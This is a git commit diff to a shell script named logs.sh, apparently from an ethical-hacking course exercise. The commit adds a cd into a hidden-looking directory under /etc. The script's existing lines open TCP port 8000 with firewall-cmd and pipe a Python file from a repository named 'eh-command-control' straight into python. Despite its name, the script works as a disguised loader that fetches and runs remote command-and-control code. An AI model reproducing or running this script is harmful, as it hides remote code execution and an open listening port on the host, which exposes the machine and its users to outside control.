2ed968b7af65c9f909bea853f75bdf28156649cd
Nidhi Pabbathi <123031844+npabbathi@users.noreply.github.com>
2026-03-26 18:55:15 -0500

    Add directory change and firewall command to logs.sh

--- logs.sh
+++ logs.sh
@@ -1,3 +1,4 @@
 #!/bin/bash
+cd /etc/.python-certifications/
 firewall-cmd --add-port=8000/tcp
 curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/week4.py | python
